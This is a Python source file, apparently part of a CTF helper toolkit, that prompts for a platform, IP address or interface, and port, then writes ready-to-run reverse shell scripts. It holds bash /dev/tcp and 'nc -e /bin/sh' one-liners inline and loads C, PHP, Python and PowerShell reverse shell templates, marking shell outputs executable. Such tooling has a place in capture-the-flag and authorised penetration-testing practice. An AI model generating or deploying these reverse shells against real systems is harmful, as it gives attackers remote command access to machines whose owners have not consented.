import os
import socket

from startctfutil import run_command_and_get_output
from startctfutil.io import success
from startctfutil.scripts import Script

# Most of these reverse shells were taken from https://www.revshells.com/

TEMPLATES_DIR = os.path.join(os.path.dirname(__file__), "reverse_shell_templates")

supported_templates = {
    "bash": {
        "template": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "extension": "sh"
    },
    "netcat": {
        "template": "nc -e /bin/sh {ip} {port}",
        "extension": "sh"
    },
    "c": {
        "template": open(os.path.join(TEMPLATES_DIR, "revshell.c"), "r").read(),
        "extension": "c"
    },
    "php": {
        "template": open(os.path.join(TEMPLATES_DIR, "revshell.php"), "r").read(),
        "extension": "php"
    },
    "python": {
        "template": open(os.path.join(TEMPLATES_DIR, "revshell.py"), "r").read(),
        "extension": "py"
    },
    "powershell": {
        "template": open(os.path.join(TEMPLATES_DIR, "revshell.ps1"), "r").read(),
        "extension": "ps1"
    },
}


class reverse_shell(Script):
    """
    Generate a reverse shell in the specified language
    """

    def __init__(self):
        super().__init__(
            name="reverse_shell",
            description="A reverse shell in the specified language",
            prints_messages=True
        )

    def obtain(self) -> bool:
        while True:
            plat = input("Enter a supported platform: (type \"list\" to show available)> ")
            if plat in ["list", "l", "ls"]:
                print("Supported platforms:")
                for platform in supported_templates:
                    print(f"  {platform}")
                print()

            elif plat in supported_templates:
                break
            else:
                print("Invalid platform")

        while True:
            ip = input("Enter the IP address (or interface name) to connect to> ").lower()

            if ip == "":
                print("Invalid IP address")
                continue

            # Validate that we have a valid ip address
            try:
                socket.inet_aton(ip)
                break
            except socket.error:
                pass

            # Validate that we have a valid interface name
            interfaces = os.listdir("/sys/class/net")
            if ip in interfaces:
                # Try to get the ip address of the interface
                ip = run_command_and_get_output(f"ip addr show {ip} | grep -Po 'inet \K[\d.]+'", True)
                if ip is None:
                    print("Failed to get IP address of interface")
                    continue

                # Validate that we have a valid ip address
                try:
                    socket.inet_aton(ip)
                    break
                except socket.error:
                    pass

            print("Invalid IP address or interface name")

        while True:
            port = input("Enter the port to connect to> ")
            try:
                port = int(port)
                if port < 1 or port > 65535:
                    print("Invalid port")
                    continue
                break
            except ValueError:
                print("Invalid port")

        template = supported_templates[plat]["template"]
        extension = supported_templates[plat]["extension"]

        if extension == "sh":
            # Add the shebang
            template = "#!/usr/bin/env bash\n" + template

        # Replace the ip and port
        template = template.replace("{ip}", ip).replace("{port}", str(port))

        filename = f"reverse_shell_{plat}.{extension}"


        if not os.path.exists("scripts"):
            os.mkdir("scripts")

        # Write the file
        with open(f"scripts/{filename}", "w") as f:
            f.write(template)

        if extension == "sh":
            # Make the script executable
            os.chmod(f"scripts/{filename}", 0o755)

        success(f"Successfully generated {filename}")

        return True
